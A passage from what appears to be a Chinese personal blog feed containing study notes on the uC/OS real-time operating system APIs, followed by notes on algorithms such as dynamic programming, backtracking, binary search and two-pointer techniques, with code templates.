<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">获取CPU 主频。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">CPU 的主频（单位：HZ），即HCLK 时钟频率。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">CPU_INT32U <span class="title">BSP_CPU_ClkFreq</span> <span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">获取系统版本号。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，有错误，获取uC/OS 系统版本号失败。</span></span><br><span class="line"><span class="comment">其他值，uC/OS 系统版本号。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回的版本号是一个被去掉“.”符号的整数，用户需要自行处理获取真实的版本</span></span><br><span class="line"><span class="comment">号。如版本号为“V3.01.02”就返回30102</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">CPU_INT16U <span class="title">OSVersion</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>除了前面讲述的统计信息外，uC&#x2F;OS 系统还为我们提供了很多统计信息。前一章讲述的最大关中断时间就是个很重要参数。此外，全局变量OSTaskCtxSwCtr 记录了任务切换总次数，OSTaskQty 记录了被创建任务的数目， OSSchedLockTimeMax （ 需使能OS_CFG_SCHED_LOCK_TIME_MEAS_EN，位于“os_cfg.h”）记录了调度器被锁的最大时间，OSIntQNbrEntriesMax 记录了中断队列成员被使用的最大数目，OSFlagQty 记录了事件标志组对象的数目，OSMemQty 记录了内存管理（分区）对象的数目，OSMutexQty 记录了互斥信号量对象的数目，OSQQty 记录了消息队列对象的数目，OSSemQty 记录了多值信号量对象的数目，等等。</p>
<h3 id="uC-OS-II-与-uC-OS-III-区别"><a href="#uC-OS-II-与-uC-OS-III-区别" class="headerlink" title="uC&#x2F;OS-II 与 uC&#x2F;OS-III 区别"></a>uC&#x2F;OS-II 与 uC&#x2F;OS-III 区别</h3><table>
<thead>
<tr>
<th>功能</th>
<th>uC&#x2F;OS-II</th>
<th>uC&#x2F;OS-III</th>
</tr>
</thead>
<tbody><tr>
<td>最大任务数</td>
<td>256</td>
<td>无限制</td>
</tr>
<tr>
<td>每个优先级的任务数</td>
<td>1</td>
<td>无限制</td>
</tr>
<tr>
<td>时间片轮转</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>互斥信号量</td>
<td>不可嵌套</td>
<td>可嵌套</td>
</tr>
<tr>
<td>消息邮箱</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td>不通过信号量标记任务</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>不通过消息队列发送消息</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>任务的停止与恢复</td>
<td>不可嵌套</td>
<td>可嵌套</td>
</tr>
<tr>
<td>代码段需求</td>
<td>6k~26k</td>
<td>6k~20k</td>
</tr>
<tr>
<td>运行时配置</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>嵌入的测量功能</td>
<td>有限制</td>
<td>大量的</td>
</tr>
<tr>
<td>时间戳</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>汇编可视化</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>任务级的时基定时器处理</td>
<td>否</td>
<td>是</td>
</tr>
</tbody></table>
<h2 id="uC-OS-II-参考"><a href="#uC-OS-II-参考" class="headerlink" title="uC&#x2F;OS-II 参考"></a>uC&#x2F;OS-II 参考</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>代码分为与处理器相关和无关的代码，以及应用相关的代码。</p>
<p>处理器无关的代码有：ucos_ii.h，ucos_ii.c，os_tmr.c，os_time.c，os_task.c，os_sem.c，os_q.c，os_mutex.c，os_mem.c，os_mbox.c，os_flag.c，os_core.c</p>
<p>处理器相关的代码有：os_cpu.h，os_cou_a.asm，os_cpu_c.c</p>
<p>应用相关的代码有：os_cfg.h，includes.h</p>
<h3 id="任务管理-1"><a href="#任务管理-1" class="headerlink" title="任务管理"></a>任务管理</h3><p>任务是由程序，数据和PCB构成，任务之间由链表连接。</p>
<p>任务管理的相关函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">OSTaskCreate</span>()      <span class="comment">// 创建任务 OS_TASK_CREATE_EN      </span></span><br><span class="line"><span class="built_in">OSTaskCreateExt</span>()   <span class="comment">// 创建任务 OS_TASK_CREATE_EXT_EN</span></span><br><span class="line"><span class="built_in">OSTaskStkChk</span>()      <span class="comment">// 堆栈检验 OS_TASK_CREATE_EXT_EN  </span></span><br><span class="line"><span class="built_in">OSTaskDel</span>()         <span class="comment">// 删除任务 OS_TASK_DEL_EN     </span></span><br><span class="line"><span class="built_in">OSTaskDelReq</span>()      <span class="comment">// 请求删除任务 OS_TASK_DEL_EN     </span></span><br><span class="line"><span class="built_in">OSTaskSuuspend</span>()    <span class="comment">// 挂起任务 OS_TASK_SUSPEND_EN</span></span><br><span class="line"><span class="built_in">OSTaskResume</span>()      <span class="comment">// 恢复任务 OS_TASK_SUSPEND_EN</span></span><br><span class="line"><span class="built_in">OSTaskChangePrio</span>()  <span class="comment">// 改变优先级 OS_TASK_CHANGE_PRIO_EN </span></span><br><span class="line"><span class="built_in">OSTaskQuery</span>()       <span class="comment">// 查询任务信息 OS_TASK_QUERY_EN</span></span><br></pre></td></tr></table></figure>


<p>创建任务要求：</p>
<ul>
<li>创建任务不能在中断中创建；</li>
<li>且优先级范围是0~63，每个优先级与每个任务一一对应；</li>
<li>系统在运行期间可以创建任务。</li>
</ul>
<p>创建任务：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void (*task)(void *p_arg)：任务函数指针</span></span><br><span class="line"><span class="comment">void *p_arg：堆栈指针</span></span><br><span class="line"><span class="comment">OS_STK *ptos：堆栈栈顶指针</span></span><br><span class="line"><span class="comment">INT8U prio：任务优先级</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回值：返回函数错误信息</span></span><br><span class="line"><span class="comment">如果没有错误，返回OS_NO_ERR</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">INT8U <span class="title">OSTaskCreate</span><span class="params">(<span class="type">void</span> (*task)(<span class="type">void</span> *p_arg), <span class="type">void</span> *pdata, OS_STK *ptos, INT8U prio)</span></span>;</span><br></pre></td></tr></table></figure>

<p>其他任务函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// INT8U prio：优先级</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除任务</span></span><br><span class="line"><span class="function">INT8U <span class="title">OSTaskDel</span><span class="params">(INT8U prio)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 任务挂起</span></span></span><br><span class="line"><span class="function">INT8U <span class="title">OSTaskSuspend</span><span class="params">(INT8U prio)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 任务恢复</span></span></span><br><span class="line"><span class="function">INT8U <span class="title">OSTaskResume</span><span class="params">(INT8U prio)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 修改优先级</span></span></span><br><span class="line"><span class="function">INT8U <span class="title">OSTaskChangePrio</span><span class="params">(INT8U oldprio, INT8U newprio)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 查询信息</span></span></span><br><span class="line"><span class="function">INT8U <span class="title">OSTaskChangePrio</span><span class="params">(INT8U prio, OS_TCB *pdata)</span></span></span><br></pre></td></tr></table></figure>

<p>结构体OS_TCB主要包含：</p>
<ul>
<li>栈顶指针</li>
<li>控制块扩展指针</li>
<li>栈底指针</li>
<li>堆栈长度</li>
<li>创建任务的选项</li>
<li>保留</li>
<li>后一个TCB指针</li>
<li>前一个TCB指针</li>
<li>任务等待的时限</li>
<li>任务状态</li>
<li>优先级</li>
<li>用于快速访问就绪表的数据</li>
</ul>
<p>例如创建函数的使用：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Code</span></span><br><span class="line">    <span class="built_in">OSInit</span>();  <span class="comment">// 系统初始化</span></span><br><span class="line">    <span class="comment">// Code</span></span><br><span class="line">    <span class="built_in">OSTaskCreate</span>(Task, args);  <span class="comment">// 创建任务</span></span><br><span class="line">    <span class="built_in">OSTaskCreate</span>(Task, args);  <span class="comment">// 创建任务</span></span><br><span class="line">    <span class="comment">// Code</span></span><br><span class="line">    <span class="built_in">OSStart</span>();  <span class="comment">// 运行系统</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>任务代码结构：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Task</span><span class="params">(<span class="type">void</span> *pdata)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化部分</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// 其他部分</span></span><br><span class="line">        <span class="built_in">OS_ENTER_CRITICAL</span>();   <span class="comment">// 关中断</span></span><br><span class="line">        <span class="comment">// 不可中断部分</span></span><br><span class="line">        <span class="built_in">OS_EXIT_CRITICAL</span>();    <span class="comment">// 开中断</span></span><br><span class="line">        <span class="comment">// 其他部分</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外还有空闲任务和统计任务：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 空闲任务，优先最低</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTaskIddle</span><span class="params">(<span class="type">void</span> *pdata)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pdata = pdata;  <span class="comment">// 防止报错，没啥用</span></span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="built_in">OS_ENTER_CRITICAL</span>(); <span class="comment">// 关中断</span></span><br><span class="line">        OSIdleCtr++；        <span class="comment">// 计数</span></span><br><span class="line">        <span class="built_in">OS_EXIT_CRITICAL</span>();  <span class="comment">// 开中断</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计任务，用于统计CPU使用率：OSCPUsage</span></span><br><span class="line"><span class="comment">// 开启需要在OS_CFG.H中配置OS_TASK_STAT_EN 为 1</span></span><br><span class="line"><span class="comment">// 且需要在初始化 OSStatInit()</span></span><br><span class="line"><span class="built_in">OSTaskStart</span>()</span><br></pre></td></tr></table></figure>

<h3 id="任务调度"><a href="#任务调度" class="headerlink" title="任务调度"></a>任务调度</h3><p>调度器负责在任务就绪队列中选取任务，并将切换出的任务放入等待队列。调度时机有：</p>
<ul>
<li>操作系统运行开始的时候</li>
<li>任务用完一个时间片</li>
<li>产生了一个中断</li>
<li>任务自身转为等待</li>
<li>任务自身被删除</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 关闭调度</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSSchedLock</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 打开调度</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSSchedUnlock</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 切换任务</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSSched</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="时钟"><a href="#时钟" class="headerlink" title="时钟"></a>时钟</h3><p>ucos必须需要一个定时器用来做系统时钟。开启时钟必须在OSStart()之后，也就是用户任务中开启。</p>
<p>时钟管理的相关函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">OSTickISR</span>()  <span class="comment">// 时钟中断</span></span><br><span class="line"><span class="built_in">OSTimeDly</span>()  <span class="comment">// 节拍延时</span></span><br><span class="line"><span class="built_in">OSTimeDlyHMSM</span>() <span class="comment">// 时钟延时</span></span><br><span class="line"><span class="built_in">OSTimeDlyResume</span>() <span class="comment">// 唤醒延时</span></span><br><span class="line"><span class="built_in">OSTimeGet</span>()  <span class="comment">// 获取当前时钟</span></span><br><span class="line"><span class="built_in">OSTimeSet</span>()  <span class="comment">// 设置当前时钟</span></span><br></pre></td></tr></table></figure>

<h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">OSSemCreate</span>()  <span class="comment">// 创建信号量</span></span><br><span class="line"><span class="built_in">OSSemPend</span>()    <span class="comment">// 获取信号量，会挂起</span></span><br><span class="line"><span class="built_in">OSSemPost</span>()    <span class="comment">// 发送信号量，中断可用</span></span><br><span class="line"><span class="built_in">OSSemDel</span>()     <span class="comment">// 删除信号量</span></span><br><span class="line"><span class="built_in">OSSemAccept</span>()  <span class="comment">// 无等待获取信号量，中断可用</span></span><br><span class="line"><span class="built_in">OSSemQuery</span>()   <span class="comment">// 查询信号量，中断可用</span></span><br></pre></td></tr></table></figure>

<h3 id="消息邮箱"><a href="#消息邮箱" class="headerlink" title="消息邮箱"></a>消息邮箱</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">OSMboxCreate</span>()  <span class="comment">// 创建邮箱</span></span><br><span class="line"><span class="built_in">OSMboxPend</span>()    <span class="comment">// 等待消息</span></span><br><span class="line"><span class="built_in">OSMboxPost</span>()    <span class="comment">// 发送消息</span></span><br><span class="line"><span class="built_in">OSMboxPostOpt</span>() <span class="comment">// 发送消息</span></span><br><span class="line"><span class="built_in">OSMboxDel</span>()     <span class="comment">// 删除消息</span></span><br><span class="line"><span class="built_in">OSMboxAccept</span>()  <span class="comment">// 无等待获取消息</span></span><br><span class="line"><span class="built_in">OSMboxQuery</span>()   <span class="comment">// 查询消息</span></span><br></pre></td></tr></table></figure>


<h3 id="消息队列-1"><a href="#消息队列-1" class="headerlink" title="消息队列"></a>消息队列</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">OSQCreate</span>()     <span class="comment">// 创建消息队列</span></span><br><span class="line"><span class="built_in">OSQPend</span>()       <span class="comment">// 等待获取消息</span></span><br><span class="line"><span class="built_in">OSQPostFront</span>()  <span class="comment">// 发送消息</span></span><br><span class="line"><span class="built_in">OSQPostOpt</span>()    <span class="comment">// 发送消息</span></span><br><span class="line"><span class="built_in">OSQFlush</span>()      <span class="comment">// 发送消息</span></span><br><span class="line"><span class="built_in">OSQDel</span>()        <span class="comment">// 删除消息</span></span><br><span class="line"><span class="built_in">OSQQuery</span>()      <span class="comment">// 查询消息</span></span><br><span class="line"><span class="built_in">OSQAccept</span>()     <span class="comment">// 无等待获取消息</span></span><br></pre></td></tr></table></figure>

<h3 id="内存管理-1"><a href="#内存管理-1" class="headerlink" title="内存管理"></a>内存管理</h3><p>采用固定分区法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">OSMemCreate</span>()   <span class="comment">// 创建内存分区</span></span><br><span class="line"><span class="built_in">OSMemGet</span>()      <span class="comment">// 申请内存块</span></span><br><span class="line"><span class="built_in">OSMemPut</span>()      <span class="comment">// 释放内存块</span></span><br><span class="line"><span class="built_in">OSMemQuery</span>()    <span class="comment">// 查看分区状态</span></span><br><span class="line"><span class="built_in">OSMemNameGet</span>()  <span class="comment">// 获取分区名称</span></span><br><span class="line"><span class="built_in">OSMemNameSet</span>()  <span class="comment">// 设置分区名称</span></span><br></pre></td></tr></table></figure>


















]]></content>
      <categories>
        <category>物联网与硬件</category>
      </categories>
      <tags>
        <tag>STM32F103</tag>
        <tag>UCOS III</tag>
      </tags>
  </entry>
  <entry>
    <title>算法</title>
    <url>/2021/08/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%90%86%E8%AE%BA/Algorithm/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<p><a href="https://labuladong.gitbook.io/algo/">参考</a></p>
<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><p>动态规划问题的一般形式就是求最值，例如：最长递增子序列呀，最小编辑距离等。求解动态规划的核心问题是穷举。</p>
<p>动态规划三要素：</p>
<ul>
<li>重叠子问题：需要「备忘录」或者「DP table」来优化穷举过程，避免不必要的计算。</li>
<li>最优子结构：子问题间必须互相独立。</li>
<li>状态转移方程：最困难部分，思路：明确「状态」 -&gt; 定义 dp 数组&#x2F;函数的含义 -&gt; 明确「选择」-&gt; 明确 base case。</li>
</ul>
<p>备忘录：一般使用数组，也可以使用哈希表。<br>DP table：采用自底向上的方法，去除递归，改为循环。<br>进一步优化：采用自底向上方法，还可以节省空间，去除不再需要的历史状态。</p>
<p>时间复杂度计算：子问题总数 * 每个子问题的时间</p>
<p>解题思路</p>
<ol>
<li>首先确定子问题以及子问题是否相互独立。</li>
<li>列出状态转义方程。<ol>
<li>确定状态：原问题和子问题中变换的变量。</li>
<li>确定dp函数：被递归调用的函数（自变量，因变量）。</li>
<li>确定选择状态的条件</li>
<li>明确最小子问题base case</li>
</ol>
</li>
<li>解除重复子问题<ol>
<li>使用备忘录</li>
<li>使用dp table，定义dp数组（自变量，因变量）</li>
</ol>
</li>
</ol>
<p>最优子结构：并不是动态规划问题专有的。也就是说，很多问题其实都具有最优子结构，只是其中大部分不具有重叠子问题。</p>
<p>如果问题中没有最优子结构，那么久改造它，让它有。找最优子结构的过程，其实就是证明状态转移方程正确性的过程，方程符合最优子结构就可以写暴力解了，写出暴力解就可以看出有没有重叠子问题了，有则优化，无则 OK。</p>
<h1 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h1><p>解决一个回溯问题，实际上就是一个决策树的遍历过程。不像动态规划存在重叠子问题可以优化，回溯算法就是纯暴力穷举，复杂度一般都很高。</p>
<ul>
<li>路径：也就是已经做出的选择。</li>
<li>选择列表：也就是你当前可以做的选择。</li>
<li>结束条件：也就是到达决策树底层，无法再做选择的条件。</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">result = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backtrack</span>(<span class="params">路径, 选择列表</span>):</span><br><span class="line">    <span class="keyword">if</span> 满足结束条件:</span><br><span class="line">        result.add(路径)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表:</span><br><span class="line">        做选择</span><br><span class="line">        backtrack(路径, 选择列表)</span><br><span class="line">        撤销选择</span><br></pre></td></tr></table></figure>

<h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p>二分查找：思路很简单，细节是魔鬼。<br>为了能够清晰展示所有细节，尽量用<code>else if</code>而不是<code>else</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">binarySearch</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>, right = ...;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(...) &#123;</span><br><span class="line">        <span class="comment">// 这样是为了防止数值过大导致溢出</span></span><br><span class="line">        <span class="type">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = ...</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一般的查找一个数（没有重复元素）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">binarySearch</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>; </span><br><span class="line">    <span class="type">int</span> right = nums.length - <span class="number">1</span>; <span class="comment">// 注意，是最后一个元素的索引，用的是闭区间 [x, y]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right) &#123; <span class="comment">// right = nums.length - 1 所有用 &lt;=</span></span><br><span class="line">        <span class="type">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target)</span><br><span class="line">            <span class="keyword">return</span> mid; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt; target)</span><br><span class="line">            left = mid + <span class="number">1</span>; <span class="comment">// 注意</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target)</span><br><span class="line">            right = mid - <span class="number">1</span>; <span class="comment">// 注意</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 跳出循环的条件 left == right + 1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A: <code>while(left &lt; right)</code> 的终止条件是 <code>left == right</code>，这时候区间<code>[x, x]</code>被漏掉，要在最后单独判断该区间。否则就用<code>while(left &lt;= right)</code>作为终止条件。</p>
<p>B: <code>left = mid + 1</code>，<code>right = mid - 1</code>，由于<code>mid</code>已经被搜索过了，因此在新的区间中去掉<code>mid</code>。</p>
<p>寻找左侧边界的二分搜索</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">left_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right = nums.length; <span class="comment">// 注意，用了左闭右开区间 [x, y)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123; <span class="comment">// 注意，结束条件是 [x, x)</span></span><br><span class="line">        <span class="type">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] == target) &#123; <span class="comment">// 当找到target时，不会立即退出，而是继续缩小搜索范围</span></span><br><span class="line">            right = mid;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = mid; <span class="comment">// 注意，由于左闭右开区间，取左半区间时已经消除mid了</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left; <span class="comment">// 结果含义：比target小的数有几个</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 因此也可以是</span></span><br><span class="line">    <span class="comment">// target 比所有数都大</span></span><br><span class="line">    <span class="keyword">if</span> (left == nums.length) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 类似之前算法的处理方式</span></span><br><span class="line">    <span class="keyword">return</span> nums[left] == target ? left : <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">left_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 搜索区间为 [left, right]</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            <span class="comment">// 搜索区间变为 [mid+1, right]</span></span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            <span class="comment">// 搜索区间变为 [left, mid-1]</span></span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">            <span class="comment">// 收缩右侧边界</span></span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果使用了闭区间，那么在得到结果区间[x, x]后，不会返回，而是计算了一次 right = mid - 1 变成了[x, x-1]</span></span><br><span class="line">    <span class="comment">// 由于 while 的退出条件是 left == right + 1，当 target 比 nums 中所有元素都大时，会存在索引越界</span></span><br><span class="line">    <span class="comment">// 检查出界情况</span></span><br><span class="line">    <span class="keyword">if</span> (left &gt;= nums.length || nums[left] != target)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h1><p><code>unordered_map</code> 就是哈希表（字典），它的一个方法 <code>count(key)</code> 相当于 <code>containsKey(key)</code> 可以判断键 key 是否存在。可以使用方括号访问键对应的值 <code>map[key]</code>。需要注意的是，如果该 key 不存在，C++ 会自动创建这个 key，并把 <code>map[key]</code> 赋值为 <code>0</code>。</p>
<p>滑动窗口：</p>
<ol>
<li>初始化 left &#x3D; right &#x3D; 0，把索引闭区间 [left, right] 称为一个「窗口」。</li>
<li>不断地增加 right 指针扩大窗口 [left, right]，直到窗口中的字符串符合要求。</li>
<li>我们停止增加 right，转而不断增加 left 指针缩小窗口 [left, right]，直到窗口中的字符串不再符合要求。</li>
<li>重复第 2 和第 3 步，直到 right 到达字符串 S 的尽头。</li>
</ol>
<p>总结：先移动右指针找到可行解，再移动左指针优化可行解。最后找到所有优化的可行解。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (right &lt; s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">    <span class="comment">// window 滑动窗口，采用哈希表，用于判断是否含有某字符</span></span><br><span class="line">    window.<span class="built_in">add</span>(s[right]);</span><br><span class="line">    right++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (valid) &#123;</span><br><span class="line">        window.<span class="built_in">remove</span>(s[left]);</span><br><span class="line">        left++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>快慢指针：<br>判定链表中是否含有环：如果有环，那么快指针总会碰到慢指针。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">boolean <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode fast, slow;</span><br><span class="line">    fast = slow = head;</span><br><span class="line">    <span class="keyword">while</span> (fast != null &amp;&amp; fast.next != null) &#123;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fast == slow) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到环：当快慢指针相遇时，让其中任一个指针指向头节点，然后让它俩以相同速度前进，再次相遇时所在的节点位置就是环开始的位置。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 判断有环</span></span><br><span class="line">    ListNode fast, slow;</span><br><span class="line">    fast = slow = head;</span><br><span class="line">    <span class="keyword">while</span> (fast != null &amp;&amp; fast.next != null) &#123;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        <span class="keyword">if</span> (fast == slow) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 上面的代码类似 hasCycle 函数</span></span><br><span class="line">    slow = head;</span><br><span class="line">    <span class="keyword">while</span> (slow != fast) &#123;</span><br><span class="line">        fast = fast.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找链表中点；<br>找链表倒数第K个元素。</p>
